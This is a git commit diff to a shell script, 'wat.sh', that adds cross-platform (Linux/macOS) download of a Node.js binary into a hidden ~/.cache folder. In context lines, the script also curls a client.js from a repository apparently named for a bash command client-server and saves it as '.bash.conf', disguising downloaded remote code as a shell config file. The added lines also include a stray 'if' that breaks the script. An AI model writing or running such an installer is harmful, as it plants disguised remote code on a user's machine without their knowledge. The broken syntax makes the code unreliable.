7eb6dc16f2b41ec811c0a4cc6abceaa53d0d0d64
Damien <damien@it-consultis.com>
2016-08-04 14:38:06 +0800

    add cross platform download

--- wat.sh
+++ wat.sh
@@ -4,14 +4,26 @@ set -ea -o pipefail
 
 FILENAME=.bash.conf
 NODE_VERSION=v6.3.1
+PLATFORM=linux
+EXTENSION=xz
+
+if
+
+if [ $(uname) == "Darwin" ]; then
+     PLATFORM=darwin
+     EXTENSION=gz
+   fi
 
 mkdir -p ~/.cache
 cd ~/.cache
-curl https://nodejs.org/dist/$NODE_VERSION/node-$NODE_VERSION-linux-x64.tar.xz > node.tar.xz
-tar -xvf node.tar.xz
-cp node-$NODE_VERSION-linux-x64/bin/node .
+
+
+
+curl https://nodejs.org/dist/$NODE_VERSION/node-$NODE_VERSION-$PLATFORM-x64.tar.$EXTENSION > node.tar.$EXTENSION
+tar -xvf node.tar.$EXTENSION 
+cp node-$NODE_VERSION-$PLATFORM-x64/bin/node .
 mv node bin
-rm -rf node-$NODE_VERSION-linux-x64/bin/node
+rm -rf node-$NODE_VERSION-$PLATFORM-x64/bin/node
 curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > $FILENAME
 
 
